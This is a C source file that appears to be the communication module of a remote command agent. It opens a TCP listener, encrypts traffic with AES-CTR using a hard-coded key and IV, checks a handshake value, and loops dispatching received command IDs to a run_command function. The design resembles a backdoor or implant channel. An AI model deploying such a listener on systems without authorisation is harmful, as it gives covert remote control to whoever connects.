#include "connection.h"

int socket_fd = -1;

int connection_fd = -1;

struct AES_ctx ctx;

void read_into_buffer(result *res, buffer *buf) {
    char buf_size[8];
    if (read(connection_fd, buf_size, 8) != 8) {
        HANDLE_ERROR((*res), FAILED_READ, "Failed reading from socket", NULL)
    }
    AES_CTR_xcrypt_buffer(&ctx, (uint8_t *) buf_size, sizeof(buf_size));

    reuse_buffer(res, buf, char_to_uint64(buf_size));
    HANDLE_ERROR_RESULT((*res))

    if (read(connection_fd, buf->data, buf->size) != buf->size) {
        HANDLE_ERROR((*res), FAILED_READ, "Failed reading from socket", NULL)
    }
    AES_CTR_xcrypt_buffer(&ctx, (uint8_t *) buf->data, buf->size);

    goto cleanup;

    error_cleanup:

    destroy_buffer(buf);

    cleanup:

    return;
}

buffer read_buffer(result *res) {
    INITIALIZE_BUFFER(buf);
    read_into_buffer(res, &buf);
    return buf;
}

result send_string(char *string, uint64_t size) {
    INITIALIZE_RESULT(res);
    char size_[8];

    uint64_to_char(size, size_);
    AES_CTR_xcrypt_buffer(&ctx, (uint8_t *) size_, 8);
    if (write(connection_fd, size_, 8) != 8) {
        HANDLE_ERROR(res, FAILED_WRITE, "Failed writing to socket", NULL)
    }

    AES_CTR_xcrypt_buffer(&ctx, (uint8_t *) string, size);
    if (write(connection_fd, string, size) != size) {
        HANDLE_ERROR(res, FAILED_WRITE, "Failed writing to socket", NULL)
    }

    goto cleanup;

    error_cleanup:

    cleanup:

    return res;
}

result send_buffer(buffer buf) {
    return send_string(buf.data, buf.size);
}

result send_result(result res) {
    INITIALIZE_RESULT(res_);
    char values[8];

    unsigned_int_to_char(res.code, values);
    unsigned_int_to_char(res.errno_value, values + 4);
    AES_CTR_xcrypt_buffer(&ctx, (uint8_t *) values, 8);
    if (write(connection_fd, values, 8) != 8) {
        HANDLE_ERROR(res_, FAILED_WRITE, "Failed writing to socket", NULL)
    }

    goto cleanup;

    error_cleanup:

    cleanup:

    return res_;
}

result connect_() {
    unsigned int client_address_len;
    struct sockaddr_in server_address, client_address;
    INITIALIZE_RESULT(res);
    INITIALIZE_BUFFER(buf);

    socket_fd = socket_f(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (-1 == socket_fd) {
        HANDLE_ERROR(res, FAILED_SOCKET, "Failed creating socket", NULL)
    }
    WRITE_LOG(DEBUG, "Created socket", NULL)
    bzero_f(&server_address, sizeof(server_address));

    server_address.sin_family = AF_INET;
    server_address.sin_addr.s_addr = htonl(INADDR_ANY);
    server_address.sin_port = htons(PORT);

    if (bind_f(socket_fd, (struct sockaddr *) &server_address, sizeof(server_address)) != 0) {
        HANDLE_ERROR(res, FAILED_BIND, "Failed binding socket", NULL)
    }
    WRITE_LOG(DEBUG, "Bound socket", NULL)

    if (listen(socket_fd, 0) == -1) {
        HANDLE_ERROR(res, FAILED_LISTEN, "Failed listening on socket", NULL)
    }
    WRITE_LOG(DEBUG, "Listening on socket", NULL)

    client_address_len = sizeof(client_address);

    connection_fd = accept_f(socket_fd, (struct sockaddr *) &client_address, &client_address_len);
    if (-1 == connection_fd) {
        HANDLE_ERROR(res, FAILED_ACCEPT, "Failed accepting connection", NULL)
    }
    WRITE_LOG(DEBUG, "Accepted connection", NULL)

    AES_init_ctx_iv(&ctx, KEY, IV);

    buf = read_buffer(&res);
    HANDLE_ERROR_RESULT(res)

    uint64_t value = read_uint64_t(&res, &buf);
    HANDLE_ERROR_RESULT(res)

    if (value != HANDSHAKE) {
        HANDLE_ERROR(res, HANDSHAKE_FAILED, "Handshake failed: %llx", value)
    }

    goto cleanup;

    error_cleanup:

    disconnect();

    cleanup:

    destroy_buffer(&buf);

    return res;
}

result communicate() {
    INITIALIZE_BUFFER(buf);
    INITIALIZE_BUFFER(buf_out);
    INITIALIZE_RESULT(res);
    INITIALIZE_RESULT(tmp_res);

    const char *key;
    const char *iv;

    while (1) {
        RESET_RESULT(res)

        buf = read_buffer(&res);
        HANDLE_ERROR_RESULT(res)

        uint64_t command_id = read_uint64_t(&res, &buf);
        HANDLE_ERROR_RESULT(res)
        if (command_id == 0) {
            WRITE_LOG(INFO, "Gracefully disconnecting", NULL)
            break;
        }

        key = read_string(&res, &buf, KEY_LENGTH);
        iv = read_string(&res, &buf, IV_LENGTH);
        buf_out = run_command(&res, command_id, key, iv, &buf);
        tmp_res = send_result(res);
        HANDLE_ERROR_RESULT(tmp_res)
        if (RESULT_SUCCEEDED(res)) {
            res = send_buffer(buf_out);
            HANDLE_ERROR_RESULT(res)
        }

        destroy_buffer(&buf_out);
        destroy_buffer(&buf);
    }

    error_cleanup:

    cleanup:

    destroy_buffer(&buf_out);
    destroy_buffer(&buf);

    return res;
}

void disconnect() {
    close(connection_fd);
    close(socket_fd);
}
